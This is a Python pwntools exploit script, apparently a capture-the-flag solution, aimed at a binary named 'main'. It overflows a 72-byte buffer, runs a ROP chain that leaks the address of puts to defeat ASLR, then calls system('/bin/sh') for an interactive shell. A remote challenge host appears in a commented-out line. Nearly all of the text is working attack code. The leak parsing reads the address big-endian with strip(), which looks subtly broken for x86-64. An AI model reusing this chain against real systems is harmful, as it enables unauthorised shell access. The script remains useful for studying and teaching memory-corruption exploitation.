# 1. Run "ROPgadget --binary ./main"
# 0x0000000000401196 : pop rdi ; ret

# 2. Run "objdump -R ./main"
# 0000000000404000 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5

# 3. Run "objdump -d ./main"
# 0000000000401070 <puts@plt>:

from pwn import *
import struct

# Set up the binary
elf = ELF('./main')
libc = ELF('./libc.so.6')
p = process('./main')
# p = remote('ctf.csd.lol', 2020)

# Addresses from Ghidra
main_addr = 0x004011ee  # FUN_004011ee
puts_plt = elf.plt['puts']  # We can still get these from PLT
puts_got = elf.got['puts']  # And GOT

# ROP gadgets (find these using ROPgadget)
pop_rdi = 0x401196  # pop rdi; ret

# First payload - leak puts
payload1 = b'A' * 72  # Buffer + saved rbp
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

# Send first payload
p.recvuntil(b"vault: ")
p.sendline(payload1)

# Get leak and calculate libc base
p.recvuntil(b"entered: ")
p.recvline()  # Read our input echo
leaked_puts = p.recvline()[:8].strip()	
leaked_puts = int.from_bytes(leaked_puts, byteorder='big')
libc_base = leaked_puts - libc.symbols['puts']

# Calculate system and /bin/sh
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# Second payload - get shell
payload2 = b'A' * 72
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

# Send second payload
p.recvuntil(b"vault: ")
p.sendline(payload2)

# Get shell
p.interactive()
